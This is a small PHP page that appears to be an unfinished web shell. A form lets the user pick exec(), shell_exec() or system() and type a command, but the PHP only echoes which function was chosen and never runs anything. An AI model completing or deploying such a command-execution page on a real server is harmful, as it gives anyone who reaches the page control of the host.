
<html>
    <head>

    </head>
    <body>
        <div>
            <form action="#" method="POST">    
                <div id="config">
                    <input type="radio" name="function" value="exec"><label>exec()</label>
                    <input type="radio" name="function" value="shell_exec"><label>shell_exec()</label>
                    <input type="radio" name="function" value="system"><label>system()</label>
                </div>
                <div>
                    <input type="text" name="cmd"/>
                </div>
            </form>
        </div>



    </body>
</html>


<?php

    if(isset($_REQUEST['cmd'])){
        echo "cmd recieve";
        if($_REQUEST['function'] == "exec"){
            echo " function choose : exec";
        }
        elseif($_REQUEST['function'] == "shell_exec"){
            echo "shell_exec";
        }
    }

?>